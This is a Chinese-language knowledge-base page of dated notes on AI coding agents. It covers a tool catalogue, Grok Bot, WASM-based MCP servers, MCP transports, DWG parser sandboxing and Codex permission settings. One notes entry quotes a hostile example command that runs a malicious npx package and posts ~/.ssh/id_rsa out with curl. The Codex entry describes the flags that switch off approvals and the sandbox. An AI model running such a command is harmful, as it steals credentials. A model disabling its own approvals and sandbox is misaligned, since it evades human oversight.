# AI 编程

## 综述

编程智能体（Coding Agent）的核心是读取项目、修改文件、调用工具并根据执行结果继续修正。承接 Claude Code 的机制与学习地图，本领域从工具生态比较使用入口和工作方式：工程开发工具覆盖终端、集成开发环境（Integrated Development Environment，IDE）、桌面和云端；开源工具强调可配置的模型与运行环境；应用构建平台把生成、运行、预览和发布放在一起。以下是 2026-09-22 根据一手资料核实的 30 个代表性工具或产品系列，不是效果排名或完整名录。名称需要跟随现行文档：原通义灵码纳入 Qoder CN 系列，TRAE 开发工具现称 TraeCode，Windsurf 的后续产品是 Devin Desktop；Roo Code 仓库已归档，iFlow 官方托管服务已关闭。后续选型需要用实际仓库验证，当前未做效果、费用或地区可用性实测。2026-09-23 增补产品形态观察：SpaceXAI（原 xAI，2026-02-02 并入 SpaceX）于 2026-08-11 发布 Grok Bot，把智能体从会话式助手推向持久队友——每个 Bot 有专属的持久云端计算机、7×24 在线、可经一次演示学会例行任务；同家族的 Grok Build 是终端编程智能体，与上表工具同类但未纳入原清单。2026-09-28 核实：OpenCode 能接入多家在线提供商和本地模型，实际可用模型以已配置提供商的列表为准；OpenCode Zen 只是可选提供商之一。2026-10-19 核实 ZCode 桌面版实现：基于 Electron 41，以 electron-builder 打包多平台安装包，属“JS 携带 Chromium+Node.js 运行时分发”而非原生编译；桌面内置 Agent 可产出 V8 字节码，CLI 版另有可选的 Node.js SEA 单可执行打包。2026-10-20 核实 WASM 与 MCP 的组合可行：MCP 只约束 JSON-RPC 消息与传输绑定、不约束服务器实现技术，WASM 因此可以封装为 MCP 工具，已有自建宿主内嵌 Wasmtime、插件型服务器（微软 Wassette、hyper-mcp）与服务器整体编译为 WASM（Wasmcp/Spin）三种形态，收益是能力式沙箱与 OCI 小体积分发，限制是系统能力须宿主显式授予且生态碎片化。2026-10-25 修正 MCP 接入与并发理解：npx 是启动命令，stdio 和 Streamable HTTP 才是传输；需要访问本机能力通常要求服务器或桥接组件在本机运行，本机服务器也可以监听回环 HTTP。旧 HTTP+SSE 传输已弃用，但 SSE 仍用于当前 Streamable HTTP；stdio 的共享消息通道不强制工具串行执行，实际并发取决于 SDK、处理函数与资源约束。本地第三方服务器是具有进程权限的代码，MCP 不自动提供沙箱；远程服务器可见发送给它的数据。系统学习路线和现行 2026-07-28 规范的版本界限见 MCP 领域。2026-10-20 核实云端部署的并发语义与替代判断：Wasmtime 中每实例独占线性内存、不同 Store 的实例可跨线程并行，按请求实例化即天然隔离、可水平扩展，多人并发问题属普通后端范围（无状态设计、网关认证限流）；可信用户场景云端可直接原生 C++，接收不可信 DWG 上传时 WASM 内存沙箱仍有真实价值——DWG 解析器连年堆溢出 CVE（如 LibreDWG CVE-2025-61154，恶意 DWG 触发），原生溢出最坏可升级为代码执行，WASM 中被限制在线性内存内、最多该请求崩溃。2026-10-25 补充 Codex 权限设置：完整访问（Full access）同时关闭命令审批与沙箱边界，对应 approval_policy = "never" 和 sandbox_mode = "danger-full-access"；命令行可用 codex --yolo，桌面／IDE 使用输入框下方权限菜单，CLI 会话可用 /permissions；用户默认配置位于 ~/.codex/config.toml，仍受更高优先级配置与组织要求约束。

## 2026-09-22 · 国内外 AI Agent 编程工具概览
- **问**：目前市面上有哪些 AI Agent 编程工具，国内国外都整理。
- **答**：代表性清单包括 12 个海外工程开发工具或系列、9 个国内厂商工具或系列、5 个国际开源工具和 4 个海外应用构建平台；同一产品可能同时提供终端、IDE、桌面与云端入口，不能按入口重复计数。产品名称与服务状态需要按现行官方文档核对，不能沿用旧榜单。
- **信源**：[一手] 各工具的官方文档、官网或官方源码仓库，逐项链接见下表；命名变化和停服状态另附官方公告。
- **关联**：[[Claude Code#2026-09-21 · 系统学习 Claude Code 与 Agent 原理的学习地图]]

### 收录口径

- 国内外按产品团队背景整理，Qoder 的国际产品仍放在国内厂商组。
- IDE 指集成开发环境；命令行界面（Command-Line Interface，CLI）在表中写作“终端”。
- “特点”是对官方能力描述的概括，不代表已实测的质量优势。
- 开源工具仍可能产生模型调用、托管或企业功能费用，不等于整套服务免费。

### 海外工程开发工具：12 个

| 工具 / 系列 | 厂商 / 团队 | 主要入口 | 官方描述的特点与一手来源 |
| --- | --- | --- | --- |
| Claude Code | Anthropic | 终端、IDE、桌面、网页 | 读库、跨文件改动、执行命令与验证；[概览](https://code.claude.com/docs/en/overview) |
| Codex | OpenAI | 终端、IDE、桌面、云端 | 本地修改和执行检查，云端可并行委派任务；[CLI](https://learn.chatgpt.com/docs/codex/cli)、[云端](https://learn.chatgpt.com/docs/cloud) |
| Cursor | Cursor 团队 | AI 编辑器、终端、云端 | Agent 检索项目、编辑文件、运行终端与浏览器工具；[Agent 概览](https://cursor.com/docs/agent/overview) |
| GitHub Copilot | GitHub / Microsoft | IDE、桌面、终端、云端 | IDE Agent 执行多步骤任务，云端 Agent 可接收 issue 并准备 pull request；[IDE Agent](https://docs.github.com/en/copilot/how-tos/chat-with-copilot/chat-in-ide)、[云端 Agent](https://docs.github.com/en/copilot/how-tos/copilot-on-github/use-copilot-agents/overview)、[桌面](https://docs.github.com/en/copilot/how-tos/github-copilot-app/agent-sessions)、[CLI](https://docs.github.com/en/copilot/concepts/agents/copilot-cli/autopilot) |
| Devin / Devin Desktop | Cognition | 云端、桌面 IDE、终端 | 云端执行开发任务，桌面统一管理本地与云端 Agent；Devin Desktop 为 Windsurf 后续产品；[Devin](https://docs.devin.ai/get-started/devin-intro)、[官方发布说明](https://cognition.com/blog/introducing-devin-desktop) |
| Gemini CLI | Google | 终端 | 开源终端 Agent，可使用文件、Shell 和搜索工具；[官方仓库](https://github.com/google-gemini/gemini-cli)、[工具参考](https://geminicli.com/docs/reference/tools/) |
| Antigravity | Google | 桌面、IDE、终端 | 管理并行 Agent，结合编辑器、终端和浏览器执行开发任务；[官网](https://www.antigravity.google/)、[概览](https://antigravity.google/docs/overview) |
| Kiro | AWS | IDE、终端、云端 | 将需求转成规范与任务，并提供事件钩子和 Agent 执行；[官网](https://kiro.dev/)、[CLI](https://kiro.dev/cli/) |
| Junie | JetBrains | JetBrains IDE、终端 | 使用 IDE 语义索引、构建、测试和调试工具；[IDE 文档](https://junie.jetbrains.com/docs/junie-ide-plugin.html)、[正式发布说明](https://blog.jetbrains.com/junie/2026/06/junie-coding-agent-out-of-beta/) |
| Augment Code / Auggie | Augment Code | IDE、终端、自动化平台 | 上下文引擎支撑代码库理解，提供编码、审查和触发式任务；[官方概览](https://docs.augmentcode.com/introduction) |
| Amp | Amp 团队 | 终端、网页、桌面 | 多模型编程 Agent，支持本地执行和每任务独立的云端环境；[官方文档](https://ampcode.com/docs) |
| Droid | Factory | 终端 | 理解代码库、形成计划、修改代码并执行检查；[快速开始](https://docs.factory.ai/droid-cli/quickstart) |

### 国内厂商工具：9 个

| 工具 / 系列 | 厂商 / 团队 | 主要入口 | 官方描述的特点与一手来源 |
| --- | --- | --- | --- |
| TRAE / TraeCode | 字节跳动 | IDE、终端 | IDE 模式与 SOLO 模式；支持规划、编码、测试和预览；[TraeCode 概览](https://docs.trae.cn/ide_what-is-trae-code)、[CLI](https://docs.trae.cn/cli_get-started-with-trae-cli) |
| Qoder / Qoder CN（含原通义灵码） | 阿里云 | IDE、插件、终端 | 国际产品有 Quest 任务委派；国内产品系列已纳入原通义灵码；[Qoder IDE](https://qoder.com/ide)、[Qoder CN](https://help.aliyun.com/zh/lingma) |
| Qwen Code | 阿里 Qwen 团队 | 终端、桌面、编辑器 | 开源 Agent，支持多模型、子 Agent 和工具扩展；[官方仓库](https://github.com/QwenLM/qwen-code) |
| CodeBuddy | 腾讯云 | IDE、插件、终端 | 复杂开发任务分步执行、查看变更与预览；[智能体模式](https://www.codebuddy.cn/docs/ide/User-guide/Agent-Mode/Overview)、[官网](https://www.codebuddy.cn/) |
| 文心快码 Comate | 百度 | IDE、插件 | 内置 Zulu 和专业 Agent，支持多文件编辑、终端与多 Agent 协作；[产品介绍](https://comate.baidu.com/docs/vscode.html) |
| 华为云码道 CodeArts 代码智能体 | 华为云 | IDE、终端 | 项目级开发，提供探索/规范模式以及 Build/Plan Agent；[产品介绍](https://support.huaweicloud.com/intl/zh-cn/productdesc-codeartsagent/codeartsagent_pd_0001.html)、[CLI Agent](https://support.huaweicloud.com/intl/zh-cn/usermanual-cli/codeartsagent_cli_0031.html) |
| Kimi Code | 月之暗面 | 终端、桌面、VS Code | 读写代码、执行命令和验证结果；当前 CLI 已升级为 Node.js 版本；[官方概览](https://www.kimi.com/code/docs/en/) |
| ZCode | 智谱 | 桌面开发环境 | 自研 ZCode Agent 驱动编码、调试与浏览器预览，支持自配模型服务；[官方问答](https://zcode.z.ai/cn/docs/qa) |
| CoStrict | 深信服 / CoStrict 团队 | 插件、终端、云端 | 开源、支持私有部署；规范流程包括需求、设计、任务和测试；[官方仓库](https://github.com/zgsm-ai/costrict) |

### 国际开源工具：5 个

Qwen Code、Gemini CLI、CoStrict 已列在厂商组，此处不重复计数。

| 工具 | 主要入口 | 官方描述的特点与一手来源 |
| --- | --- | --- |
| Cline | VS Code、JetBrains、终端 | 文件操作、终端与浏览器工具，支持自带模型凭据；[官方文档](https://docs.cline.bot/cline-overview) |
| Kilo Code / Kilo | IDE、终端、云端 | 多入口编码 Agent，并有代码审查和云端任务；[官网](https://kilo.ai/) |
| OpenCode | 终端、桌面、IDE | 可接多家模型或本地模型，支持并行会话；[官网](https://opencode.ai/) |
| Aider | 终端 | 偏结对编程，集成 Git；可自动运行 lint/测试并修复反馈的问题；[官网](https://aider.chat/) |
| OpenHands | 云端、自托管、本地 | 开源核心支撑可执行工程任务的 Agent 平台；[官网](https://www.openhands.dev/) |

### 海外应用构建平台：4 个

| 工具 | 厂商 | 主要工作方式与一手来源 |
| --- | --- | --- |
| Replit Agent | Replit | 在云端环境生成、运行和测试应用；[官方概览](https://docs.replit.com/features/agent/overview) |
| Lovable | Lovable | 自然语言生成前端、后端、数据库和认证，并支持发布；[官方概览](https://docs.lovable.dev/introduction/welcome) |
| Bolt.new | StackBlitz | 在浏览器中构建网站和应用，集成数据库与发布；[官方帮助](https://support.bolt.new/) |
| v0 | Vercel | 生成可预览的网站/应用代码，通过执行反馈修复生成错误；[官方工程说明](https://vercel.com/blog/how-we-made-v0-an-effective-coding-agent) |

### 旧名称和服务状态

- Windsurf：2026-06-02 官方发布 Devin Desktop，称为 Windsurf 的下一代；这里与 Devin 合并成一个产品系列计数。[一手：公告](https://cognition.com/blog/introducing-devin-desktop)
- 通义灵码：阿里云现行入口标题为 Qoder CN 系列，正文仍保留“原通义灵码”的产品关系，不将旧名称另算一个新产品。[一手：现行文档](https://help.aliyun.com/zh/lingma)
- Roo Code：官方仓库于 2026-05-15 归档，不列为持续维护的现行项目；原官网跳转至原作者的新产品 Roomote。Roomote 标明 source-available，不能直接据此称其为开源。[一手：仓库](https://github.com/RooCodeInc/Roo-Code)、[Roomote](https://roomote.dev/)
- iFlow CLI：官方于 2026-04-17 关闭托管模型调用、搜索等服务；现存客户端仍支持 OpenAI 兼容自定义模型。官网旧快速开始仍保留旧认证说明，本次按明确的官方停服公告判断服务状态。[一手：公告](https://vibex.iflow.cn/t/topic/5753)、[仓库](https://github.com/iflow-ai/iflow-cli)

### 核查范围

本次核实产品入口、公开能力、名称与公开服务状态；未安装或进行仓库任务实测，不做模型质量、成功率、价格或地区可用性排名。部分动态站点直接抓取失败，改用已读取的第一方文档或官方工程文章作为依据。

### 首要资料

- [一手] [Claude Code 概览](https://code.claude.com/docs/en/overview)
- [一手] [Codex CLI](https://learn.chatgpt.com/docs/codex/cli)
- [一手] [Qoder CN 现行文档](https://help.aliyun.com/zh/lingma)
- [一手] [TraeCode 概览](https://docs.trae.cn/ide_what-is-trae-code)
- [一手] [Devin Desktop 发布说明](https://cognition.com/blog/introducing-devin-desktop)

## 2026-09-23 · Grok Bot 是什么：常驻智能体队友产品
- **问**：Grok bot 是什么？
- **答**：Grok Bot 是 SpaceXAI（原 xAI，2026-02-02 并入 SpaceX）于 2026-08-11 发布的常驻智能体产品：用户创建多名有名字、有职责的“AI 队友”，它们 7×24 在线，共享一台按用户隔离的持久云端计算机，能登录用户的工具并以图形界面方式操作，带回完成的工作。它与 Grok 聊天机器人（2023-11-03 发布）和终端编程智能体 Grok Build 是三个产品。
- **信源**：[一手] [Grok Bot 产品页](https://x.ai/bot)、[SpaceXAI 新闻列表](https://x.ai/news)、[Grok API 文档](https://docs.x.ai)；[二手] The Verge 2026-08-12 报道（发布事件旁证）

### 关键事实（2026-09-23 核实）

- 形态：桌面客户端（macOS、Windows）与 iOS；以对话方式给 Bot 派活，可多 Bot 并行，笔记本关机后云端继续执行。
- 隔离粒度：同一用户的所有 Bot 共享一台持久云端计算机（文件、浏览器、登录态按用户隔离，不按 Bot 隔离）。
- 教学机制：Bot 可观看用户演示一遍工作流并存为例行任务，此后自主执行。
- 协作与记忆：多个 Bot 可进入同一线程互相传递工作；Bot 保留上下文并可互相学习。
- 安全：敏感操作需经 Auto Review；传输与静态加密；可退出训练；企业版支持 DLP、证书与代理。
- 订阅：Cursor Pro／Pro+／Ultra、SuperGrok／SuperGrok Plus／Heavy 及 Teams、Enterprise 计划包含，额外用量按 token 成本计费。
- 演进时间线：2026-08-11 发布；08-26 纳入 SuperGrok 与 Cursor 订阅；08-29 与 X 集成；09-03 企业版与《Designing Grok Bot for a world of persistent agents》一文；09-22 官方发布用 Grok Bot 扩展客服的用例。
- 设计原则（官方设计文章）：聊天历史变成 Bot 名册、Bot 有在线状态、有自己的计算机、工作可不经提示开始。
- 定位参照：常被与开源个人智能体 OpenClaw 对比（[二手] Lenny's Newsletter 2026-09-02）。

## 2026-09-28 · OpenCode 可以使用哪些模型
- **问**：opencode中可以用哪些模型？
- **答**：OpenCode 支持多家在线模型提供商和本地模型，具体可用模型取决于已连接的提供商、凭据与配置。官方 Zen 列有 GPT、Claude、Gemini、Grok、Qwen、DeepSeek、MiniMax、GLM、Kimi 等系列；终端输入 `/models`，或运行 `opencode models`，可查看当前配置下的准确列表。
- **信源**：[一手] [OpenCode 模型文档](https://opencode.ai/docs/models/)；[OpenCode Zen 模型列表](https://opencode.ai/docs/zen/)；[OpenCode 提供商文档](https://opencode.ai/docs/providers/)；[OpenCode CLI 文档](https://opencode.ai/docs/cli/)

## 2026-10-19 · ZCode 桌面版基于什么技术打包 JS
- **问**：GitHub 仓库 zai-org/ZCode 基于什么技术将 JS 做成桌面端？
- **答**：桌面版基于 Electron 41，以 electron-builder 打包 mac/win/linux 安装包；这是“JS 与 Chromium+Node.js 运行时一起分发”，不是编译为原生代码。仓库内真正的编译环节：主进程 TypeScript 经 tsup、渲染层 React 经 Vite 构建为 JS，node-pty 等原生模块按平台重编译，桌面内置 Agent 可编译为 V8 字节码；CLI 版另有可选的 Node.js SEA（Single Executable Application，单一可执行应用）打包。
- **信源**：[一手] [ZCode 仓库 README](https://github.com/zai-org/ZCode/blob/master/README.md)、[packages/desktop/package.json](https://github.com/zai-org/ZCode/blob/master/packages/desktop/package.json)、[apps/zcode-cli/package.json](https://github.com/zai-org/ZCode/blob/master/apps/zcode-cli/package.json)

## 2026-10-20 · 将 WASM 封装为 MCP 供 Agent 调用的可行性与形态
- **问**：是否可以将 WASM 封装成 MCP 供 agent 调用？
- **答**：可以，三种形态均已落地：① 自建宿主——用 MCP SDK 写服务器，在工具 handler 内经 Wasmtime/Extism 调用 WASM 导出函数；② 通用插件型服务器——微软 Wassette（Wasmtime + WIT 接口→MCP 工具，OCI 分发，默认拒绝授权）与 hyper-mcp（Extism 插件，可配 allowed_hosts/memory_limit，sigstore 签名；原仓库 2026-01-11 归档并迁移）；③ 服务器整体编译为 WASM——Spin/Wasmcp 把工具与中间件组合为单个 server.wasm，导出 wasi:cli/run（stdio）或 wasi:http/incoming-handler（Streamable HTTP）。可行性的根据：MCP 规范只定义 JSON-RPC 消息与传输绑定，明确 transport-agnostic，不约束服务器实现技术。收益是能力式沙箱与 OCI 小体积分发；限制是系统能力须宿主显式授予、移植到组件模型有门槛、会话与授权在各运行时实现碎片化。
- **信源**：[一手] [MCP 规范·传输（2026-07-28 版）](https://modelcontextprotocol.io/specification/2026-07-28/basic/transports)；[一手] [微软 Wassette 发布文](https://opensource.microsoft.com/blog/2025/08/06/introducing-wassette-webassembly-based-tools-for-ai-agents)；[一手] [Spin/Wasmcp 博文](https://spinframework.dev/blog/mcp-with-wasmcp)；[一手] [Wasmtime 官网（可嵌入运行时与多语言绑定）](https://wasmtime.dev/)；[一手] [tuananh/hyper-mcp 仓库（归档，项目已迁移）](https://github.com/tuananh/hyper-mcp)；注：mcp.run 经 301 重定向至 turbomcp.ai，后者未再提及 WASM，原注册表现状未核实
- **更新**：2026-10-25
- **关联**：[[Claude Code#2026-09-21 · 系统学习 Claude Code 与 Agent 原理的学习地图]]；[[AutoCAD#2026-10-13 · AutoCAD 自动化操作 MCP 的官方与社区现状]]；[[MCP#2026-10-25 · 系统学习 MCP 的完整路线与知识点]]

## 2026-10-20 · MCP 服务器接入方式：npx 本地与 HTTP 远程的选择
- **问**：mcp 有 npx 和 http，建议哪种方式？
- **旧答（已被 2026-10-25 修正）**：按工具位置与信任决定，不是二选一：需要直接访问本机（文件、数据库、本地进程）的工具只能 npx/stdio；提供官方托管 URL 的云服务用 HTTP——Claude Code 官方推荐远程用 HTTP，支持 OAuth 登录与掉线自动重连，stdio 本地进程不自动重连。两者都可用时：npx 数据不出机（除非工具自身联网），但第三方 npm 包以你的用户权限在本机执行，是 MCP 安全文档明确列出的任意代码执行与数据外传攻击面（官方示例即 `npx malicious-package && curl -d @~/.ssh/id_rsa …`）；HTTP 服务器代码不在本机跑，但对方可见全部请求数据。云端与网页客户端（如 claude.ai 连接器）只能用 HTTP；SSE 已弃用。
- **答**：npx 是包执行与启动命令，stdio 和 Streamable HTTP 才是 MCP 传输。访问本机能力通常要求服务器或桥接组件在本机运行，本机服务器可以使用 stdio 或回环 HTTP；选择还受具体宿主支持限制。弃用的是旧 HTTP+SSE 传输，当前 Streamable HTTP 仍可用请求级 SSE。
- **信源**：[一手] [Claude Code MCP 文档（添加方式、作用域、OAuth、重连）](https://code.claude.com/docs/en/mcp)；[一手] [MCP 安全最佳实践 2026-07-28 版（Local MCP Server Compromise）](https://modelcontextprotocol.io/specification/2026-07-28/basic/security_best_practices)；[一手] [MCP 规范·传输](https://modelcontextprotocol.io/specification/2026-07-28/basic/transports)
- **本次核实**：[一手] [stdio 规范](https://modelcontextprotocol.io/specification/2026-07-28/basic/transports/stdio)；[一手] [Streamable HTTP 规范（含本机绑定和 SSE）](https://modelcontextprotocol.io/specification/2026-07-28/basic/transports/streamable-http)
- **更新**：2026-10-25
- **关联**：[[MCP#2026-10-25 · 系统学习 MCP 的完整路线与知识点]]

## 2026-10-20 · DWG 处理 WASM 云端部署的并发与 C++ 替代问题
- **问**：处理 DWG 文件的 WASM 放云端会不会有并发/多人同时使用问题？云端是不是可以直接用 C++，都没必要用 WASM？
- **答**：并发与 WASM 无关。Wasmtime 官方语义：每个实例独占线性内存，Store 是隔离边界，不同 Store 的实例可跨线程并行，Engine（编译产物）线程间共享、模块只编译一次；按请求实例化即请求间零共享、天然隔离可扩展。DWG 处理"传文件回结果"天然无状态，MCP 协议本身也无状态；多人并发是普通后端问题（水平扩展、网关认证限流、单实例内存/时间限额）。旧结论“单个 stdio MCP 服务器进程内的工具调用在该实例内串行排队”已被 2026-10-25 修正：stdio 只规定共享通道、消息分帧和按请求 ID 关联结果，并不强制工具串行；实际并发取决于 SDK、处理函数和资源限制。C++ 替代：可信用户＋自有服务器时直觉正确，原生更简单且无 WASM 开销（官方称接近原生，具体百分比未实测）；公网接收不可信 DWG 上传时 WASM 内存沙箱仍有真实价值——DWG 解析器是内存安全重灾区（已核实 LibreDWG CVE-2025-61154：decode.c 的 decompress_R2004_section 堆溢出，恶意 DWG 触发 DoS，CVSS 6.5；另检索命中 CVE-2026-15520/9502/9602 同类），原生堆写溢出最坏可升级为代码执行，WASM 中溢出被限制在线性内存内、最多该请求崩溃。次级价值：每请求一实例的隔离密度比容器便宜（ResourceLimiter、PoolingAllocator 为此设计），同一 .wasm 跨本地/边缘/云端复用。
- **信源**：[一手] [Wasmtime API 文档（Engine/Store/Instance 并发与隔离语义）](https://docs.rs/wasmtime/latest/wasmtime/)；[一手] [GHSA-37rg-q294-rgvc / CVE-2025-61154 通告原文](https://github.com/advisories/GHSA-37rg-q294-rgvc)；[一手] [MCP 安全最佳实践（协议无状态）](https://modelcontextprotocol.io/specification/2026-07-28/basic/security_best_practices)；检索线索（摘要命中、未逐条打开原文）：CVE-2026-15520、CVE-2026-9502、CVE-2026-9602（SentinelOne/NVD，均指向 libredwg 溢出）；NVD 详情页动态渲染未能直接抓取

- **本次核实**：[一手] [MCP 基础消息与请求 ID](https://modelcontextprotocol.io/specification/2026-07-28/basic)；[一手] [stdio 共享通道与消息关联](https://modelcontextprotocol.io/specification/2026-07-28/basic/transports/stdio)
- **更新**：2026-10-25
- **关联**：[[MCP#2026-10-25 · 系统学习 MCP 的完整路线与知识点]]

## 2026-10-25 · Codex 如何设置无需审批的完整访问权限
- **问**：Codex 如何设置类似 Claude Code 的 bypass permissions on 完全权限？
- **答**：Codex 的 Full access 对应 approval_policy = "never" 与 sandbox_mode = "danger-full-access"；终端启动可用 codex --yolo（即 --dangerously-bypass-approvals-and-sandbox），桌面／IDE 在输入框下方权限菜单选择 Full access，CLI 会话内可用 /permissions。默认设置写入用户 ~/.codex/config.toml 顶层；never 仅关闭审批，必须同时取消沙箱才是完整访问，命令行参数、项目配置及组织强制要求仍可能影响结果。
- **信源**：[一手] [OpenAI 官方文档：Sandbox](https://learn.chatgpt.com/docs/sandboxing)；[一手] [OpenAI 官方文档：Developer commands](https://learn.chatgpt.com/docs/developer-commands?surface=cli)；[一手] [OpenAI 官方文档：Config basics](https://learn.chatgpt.com/docs/config-file/config-basic)
